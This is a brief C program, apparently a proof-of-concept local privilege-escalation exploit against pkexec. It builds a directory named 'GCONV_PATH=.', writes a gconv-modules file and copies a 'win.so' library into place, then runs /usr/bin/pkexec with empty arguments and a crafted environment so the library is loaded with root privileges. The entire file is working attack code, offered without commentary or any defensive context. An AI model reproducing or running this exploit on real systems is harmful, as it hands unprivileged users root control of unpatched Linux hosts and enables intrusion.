#include <stdio.h>


int main()
{
	char* env[] = {
		"evil",
		"PATH=GCONV_PATH=.",
		"CHARSET=win",
		"SHELL=win",
		NULL};
	system("mkdir GCONV_PATH=.");
	system("touch GCONV_PATH=./evil");
	system("mkdir evil");
	system("echo 'module\tINTERNAL\t\t\twin//\t\t\twin\t\t\t2' > evil/gconv-modules");
	system("cp win.so evil/win.so");
	execve("/usr/bin/pkexec",NULL,env);
}
